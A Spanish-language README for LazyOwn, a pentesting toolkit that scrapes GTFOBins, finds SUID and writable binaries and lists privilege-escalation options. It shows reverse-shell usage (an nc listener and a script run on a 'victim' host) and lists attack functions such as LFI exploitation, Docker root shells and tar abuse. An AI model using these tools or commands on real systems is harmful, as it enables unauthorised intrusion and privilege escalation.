# LazyOwn
![License](https://img.shields.io/github/license/grisuno/LazyOwn?style=flat-square)

```sh
██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
```
LazyOwn es un proyecto diseñado para automatizar la búsqueda y análisis de binarios con permisos especiales en sistemas Linux y Windows. El proyecto consta de tres scripts principales que extraen información de [GTFOBins](https://gtfobins.github.io/), analizan los binarios en el sistema y generan opciones basadas en la información recopilada.

https://www.reddit.com/r/LazyOwn/

Revolutionize Your Pentesting with LazyOwn: Automate Binary Analysis on Linux and Windows

https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a

Discover LazyOwn, the ultimate solution for automating the search and analysis of binaries with special permissions on both Linux and Windows systems. Our powerful tool simplifies pentesting, making it more efficient and effective. Watch this video to learn how LazyOwn can streamline your security assessments and enhance your cybersecurity toolkit.

![Captura de pantalla 2024-05-22 021136](https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d)

## Requisitos

- Python 3.x
- Módulos de Python:
  - `requests`
  - `beautifulsoup4`
  - `pandas`
- `subprocess` (incluido en la biblioteca estándar de Python)
- `platform` (incluido en la biblioteca estándar de Python)
- `tkinter` (Opcional para el GUI)
- `numpy` (Opcional para el GUI)
- 
## Instalación

1. Clona el repositorio:

```sh
git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
```
2. Instala las dependencias de Python:
```sh
pip install requeriments.txt
```
## Uso
para las busquedas 
```sh
python3 lazysearch.py binario_a_buscar
```
## Busquedas con GUI

Características adicionales y cambios:
AutocompleteEntry:

Se ha agregado un filtro para eliminar valores None de la lista de autocompletar.
Nuevo Vector de Ataque:

Añadido un botón "Nuevo Vector de Ataque" en la interfaz principal.
Implementada la funcionalidad para agregar un nuevo vector de ataque y guardar los datos actualizados en los archivos Parquet.
Exportar a CSV:

Añadido un botón "Exportar a CSV" en la interfaz principal.
Implementada la funcionalidad para exportar los datos del DataFrame a un archivo CSV seleccionado por el usuario.
Uso:
Agregar un nuevo vector de ataque: Hacer clic en el botón "Nuevo Vector de Ataque", llenar los campos y guardar.
Exportar a CSV: Hacer clic en el botón "Exportar a CSV" y seleccionar la ubicación para guardar el archivo CSV.

Nueva Función scan_system_for_binaries:

Implementa la búsqueda de binarios en el sistema utilizando el comando file para determinar si un archivo es binario.
Se utiliza os.walk para recorrer el sistema de archivos.
Los resultados se muestran en una nueva ventana de la GUI.
Botón para Buscar Binarios:

Se ha añadido un botón "Buscar Binarios en el Sistema" en la interfaz principal que llama a la función scan_system_for_binaries.
Nota:
La función is_binary utiliza el comando file de Unix para determinar si un archivo es un ejecutable binario. Si estás en un sistema operativo diferente, necesitarás ajustar este método para que sea compatible.
Esta implementación puede ser intensiva en recursos, ya que recorre todo el sistema de archivos. Podrías añadir opciones adicionales para limitar la búsqueda a directorios específicos o añadir un filtro para ciertos tipos de archivos.

```sh
python3 LazyOwnExplorer.py
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)


para ejecutar una busqueda contra la maquina a analizar 
```sh
python3 lazyown.py
```


en el caso de querer actualizar hacemos

```sh
cd LazyOwn
rm *.csv
rm *.parquet
./update_db.sh
```
El proyecto consta de tres scripts principales:

1. search.py
Este script extrae información de binarios y sus funciones desde GTFOBins y la guarda en un archivo CSV. ya hice el scraping así que mejor evitar y usar la db que ya tiene en formato csv, a menos que quieran actualizar la db
```python
import requests
from bs4 import BeautifulSoup
import csv

# URL del servidor que contiene el HTML
url = "https://gtfobins.github.io/index.html"

# Hacer una solicitud GET al servidor
response = requests.get(url)

# Verificar si la solicitud fue exitosa
if response.status_code == 200:
    html_content = response.text
else:
    print("Error al obtener el HTML del servidor")
    exit()

# Parsear el contenido HTML con Beautiful Soup
soup = BeautifulSoup(html_content, 'html.parser')

# Encontrar el contenedor de la tabla
table_wrapper = soup.find('div', id='bin-table-wrapper')

# Inicializar una lista para almacenar la información
data = []

# Recorrer todas las filas de la tabla
for row in table_wrapper.find_all('tr'):
    bin_name = row.find('a', class_='bin-name')
    if bin_name:
        bin_name_text = bin_name.text.strip()
        functions = []
        for func in row.find_all('li'):
            function_link = func.find('a')
            if function_link:
                function_href = function_link.get('href').strip()
                function_name = function_link.text.strip()
                functions.append({'name': function_name, 'href': function_href})
        
        # Añadir la información a la lista de datos
        data.append({'binary': bin_name_text, 'functions': functions})

# Guardar la información en un archivo CSV
csv_file = "bin_data.csv"
with open(csv_file, mode='w', newline='') as file:
    writer = csv.writer(file)
    writer.writerow(['Binary', 'Function Name', 'Function URL'])
    for entry in data:
        binary = entry['binary']
        for func in entry['functions']:
            writer.writerow([binary, func['name'], func['href']])

print(f"Datos guardados en {csv_file}")

```

## 2. detailed_search.py
Este script lee el archivo CSV generado por scrape_bins.py, extrae detalles adicionales de cada función y guarda los datos en un segundo archivo CSV.

```python
import requests
from bs4 import BeautifulSoup
import csv
from urllib.parse import urljoin
import time
import os

# URL base del servidor
base_url = "https://gtfobins.github.io/"

# Nombre del archivo CSV de entrada
input_csv = "bin_data.csv"

# Nombre del archivo de salida CSV
output_csv = "bin_data_relevant.csv"

# Función para obtener la información relevante de una URL
def obtener_informacion(url):
    response = requests.get(url)
    if response.status_code != 200:
        print(f"Error al obtener la URL: {url}")
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    data = []

    for section in soup.find_all('h2', class_='function-name'):
        function_name = section.text.strip()
        function_id = section.get('id')
        function_url = f"{url}#{function_id}"
        description = section.find_next('p').text.strip() if section.find_next('p') else ""
        example = section.find_next('code').text.strip() if section.find_next('code') else ""

        data.append({
            "function_name": function_name,
            "function_url": function_url,
            "description": description,
            "example": example
        })

    return data

# Leer el archivo CSV de entrada
binarios_funciones = {}
with open(input_csv, mode='r', encoding='utf-8') as file:
    reader = csv.DictReader(file)
    for row in reader:
        binary = row['Binary']
        if binary not in binarios_funciones:
            binarios_funciones[binary] = row['Function URL'].split('#')[0]

# Verificar si ya existe un archivo de salida y hasta dónde se ha procesado
resume = False
if os.path.exists(output_csv):
    with open(output_csv, mode='r', encoding='utf-8') as file:
        reader = csv.reader(file)
        rows = list(reader)
        if len(rows) > 1:
            last_processed = rows[-1][2]
            resume = True

# Inicializar una lista para almacenar toda la información
informacion_binarios = []

# Abrir el archivo CSV para escritura
csv_file = open(output_csv, mode='w', newline='', encoding='utf-8')
csv_writer = csv.writer(csv_file)
csv_writer.writerow(['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])

# Recorrer la lista de binarios y sus funciones
for binary, url in binarios_funciones.items():
    # Si estamos retomando desde un punto anterior, saltamos hasta el último URL procesado
    if resume:
        if url != last_processed:
            continue
        else:
            resume = False
    full_url = urljoin(base_url, url)
    
    informacion = obtener_informacion(full_url)
    for item in informacion:
        informacion_binarios.append({
            "binary": binary,
            "function_name": item["function_name"],
            "function_url": item["function_url"],
            "description": item["description"],
            "example": item["example"]
        })
        # Guardar la información en el archivo CSV
        csv_writer.writerow([binary, item['function_name'], item['function_url'], item['description'], item['example']])
        print(f"[+] Binary: {binary} {item['function_name']}")
    # Hacemos una pausa de 5 segundos entre cada solicitud de URL
    time.sleep(5)

# Cerrar el archivo CSV
csv_file.close()

print(f"Datos guardados en {output_csv}")

```

3. lazyown.py
Este script analiza los binarios en el sistema y genera opciones basadas en la información recopilada. Detecta si el sistema operativo es Linux o Windows y ejecuta el comando adecuado para buscar binarios con permisos elevados.

```python
import pandas as pd
import os
import subprocess
import platform

# Lee los CSVs y crea los DataFrames
df1 = pd.read_csv('bin_data.csv')
df2 = pd.read_csv('bin_data_relevant.csv')

# Guarda los DataFrames como Parquet
df1.to_parquet('binarios.parquet')
df2.to_parquet('detalles.parquet')

# Función para realizar la búsqueda y generar el CSV de salida
def buscar_binarios():
    binarios_encontrados = set()
    
    # Detecta el sistema operativo
    sistema_operativo = platform.system()
    
    if sistema_operativo == 'Linux':
        # Ejecuta el comando find para Linux
        result = subprocess.run(['find', '/', '-perm', '4000', '-ls'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        
        # Extrae los binarios encontrados
        for line in output.split('\n'):
            if line:
                binario = os.path.basename(line.split()[-1])
                binarios_encontrados.add(binario)
    
    elif sistema_operativo == 'Windows':
        # Script de PowerShell para Windows
        powershell_script = """
        $directories = @("C:\\Windows\\System32", "C:\\", "C:\\Program Files", "C:\\Program Files (x86)")
        foreach ($dir in $directories) {
            Get-ChildItem -Path $dir -Recurse -Filter *.exe -ErrorAction SilentlyContinue | 
            ForEach-Object {
                $acl = Get-Acl $_.FullName
                $privileges = $acl.Access | Where-Object { $_.FileSystemRights -match "FullControl" }
                if ($privileges) {
                    Write-Output "$($_.FullName)"
                }
            }
        }
        """
        
        # Ejecuta el script de PowerShell
        result = subprocess.run(['powershell', '-Command', powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        
        # Extrae los binarios encontrados
        for line in output.split('\n'):
            if line:
                binario = os.path.basename(line.strip())
                binarios_encontrados.add(binario)
    
    # Filtra el DataFrame principal con los binarios encontrados
    df_binarios_encontrados = df1[df1['Binary'].isin(binarios_encontrados)]
    
    # Genera un CSV con los detalles de los binarios encontrados
    with open('resultado.csv', 'w') as f:
        for binario in binarios_encontrados:
            detalles = df2[df2['Binary'] == binario]
            if not detalles.empty:
                f.write(detalles.to_csv(index=False, header=False))
                print(detalles.to_csv(index=False, header=False))

# Función para ejecutar opciones basadas en los datos encontrados
def ejecutar_opciones():
    df_resultado = pd.read_csv('resultado.csv', header=None, names=['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])
    
    for binario in df_resultado['Binary'].unique():
        print(f"Binario encontrado: {binario}")
        detalles = df_resultado[df_resultado['Binary'] == binario]

        print("Opciones:")
        for i, (_, row) in enumerate(detalles.iterrows(), start=1):
            print(f"{i}. {row['Function Name']} - {row['Description']}")
        print(f"{i+1}. No hacer nada y salir")
        
        while True:
            opcion = input("Seleccione una opción: ")
            if opcion.isdigit() and 1 <= int(opcion) <= len(detalles) + 1:
                break
            else:
                print("Opción no válida. Por favor, intente de nuevo.")
        
        opcion = int(opcion)
        
        if opcion <= len(detalles):
            print(f"Ejecutando opción {opcion} para {binario}")
            # Código para ejecutar la opción correspondiente
            print(f"Ejemplo de ejecución:\n{detalles.iloc[opcion-1]['Example']}")
            # Aquí puedes agregar el código para ejecutar el ejemplo si es necesario
        else:
            print("Saliendo")
            break

if __name__ == '__main__':
    buscar_binarios()
    ejecutar_opciones()

```
## Uso modo LazeReverseShell
primero nos ponemos en escucha con el comando 


```sh
nc -nlvp 1337 #o el puerto que escojamos 
```

para luego en la maquina victima 
```sh
./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
```

## Uso modo LazyAtack
Este script de pentesting en Bash permite ejecutar una serie de pruebas de seguridad en modo servidor (máquina víctima) o en modo cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece diferentes opciones y funcionalidades para llevar a cabo diversas acciones de prueba de penetración.

Opciones del Script
Modo Servidor:

Ejecuta en la máquina víctima.
Ofrece opciones como iniciar un servidor HTTP, configurar netcat para escuchar conexiones, enviar archivos mediante netcat, configurar una shell reversa, entre otros.
Modo Cliente:

Ejecuta en la máquina atacante.
Ofrece opciones como descargar listas de SecLists, escanear puertos, enumerar servicios HTTP, verificar conectividad, monitorear procesos, ejecutar ataques LFI, entre otros.
Ejemplos de Uso
Uso Básico


```sh
./lazyatack.sh --modo servidor --ip 192.168.1.1 --atacante 192.168.1.100
```

```sh
./lazyatack.sh --modo cliente --url http://victima.com --ip 192.168.1.10
```
Esto ejecuta el script en modo cliente, configurando la URL de la víctima como http://victima.com y la IP de la víctima como 192.168.1.10.

## Funciones del Script

```
Funciones del Script
Descargar SecLists: Descarga y extrae las listas de SecLists para su uso.
Escanear Puertos: Ejecuta un escaneo completo de puertos usando nmap.
Escanear Puertos Específicos: Escanea puertos específicos (22, 80, 443).
Enumerar Servicios HTTP: Enumera servicios HTTP en la URL víctima.
Iniciar Servidor HTTP: Inicia un servidor HTTP en el puerto 80.
Configurar Netcat: Configura netcat para escuchar en el puerto 443.
Enviar Archivo Mediante Netcat: Envía un archivo a una escucha netcat.
Verificar Conectividad: Verifica la conectividad mediante ping y tcpdump.
Verificar Conectividad con Curl: Verifica la conectividad usando curl.
Configurar Shell Reversa: Configura una shell reversa.
Escuchar Shell con Netcat: Escucha una shell con netcat.
Monitorear Procesos: Monitorea los procesos en ejecución.
Ejecutar Wfuzz: Ejecuta un ataque de enumeración de directorios web con wfuzz.
Comprobar Permisos Sudo: Comprueba los permisos de sudo.
Explotar LFI: Explota una vulnerabilidad de inclusión de archivos locales.
Configurar TTY: Configura TTY para una sesión shell más estable.
Eliminar Archivos de Forma Segura: Elimina archivos de forma segura.
Obtener Root Shell mediante Docker: Obtiene una root shell mediante Docker.
Enumerar Archivos con SUID: Enumera archivos con permisos SUID.
Listar Timers de Systemd: Lista timers de systemd.
Comprobar Rutas de Comandos: Comprueba rutas de comandos.
Abusar de Tar: Abusa de tar para ejecutar una shell.
Enumerar Puertos Abiertos: Enumera puertos abiertos.
Eliminar Contenedores Docker: Elimina todos los contenedores Docker.
Escanear Red: Escanea la red con secuencia y xargs.
```
## Menús Interactivos
El script presenta menús interactivos para seleccionar las acciones a realizar. En modo servidor, muestra opciones relevantes para la máquina víctima, y en modo cliente, muestra opciones relevantes para la máquina atacante.

Interrupción Limpia
El script maneja la señal SIGINT (usualmente generada por Control + C) para salir limpiamente.
## Licencia
Este proyecto está licenciado bajo la Licencia GPL v3. La información contenida en GTFOBins es propiedad de sus autores, a quienes se les agradece enormemente por la información proporcionada.

## Agradecimientos
Un agradecimiento especial a  [GTFOBins](https://gtfobins.github.io/) por la valiosa información que proporcionan y a ti por utilizar este proyecto. ¡Gracias por tu apoyo!
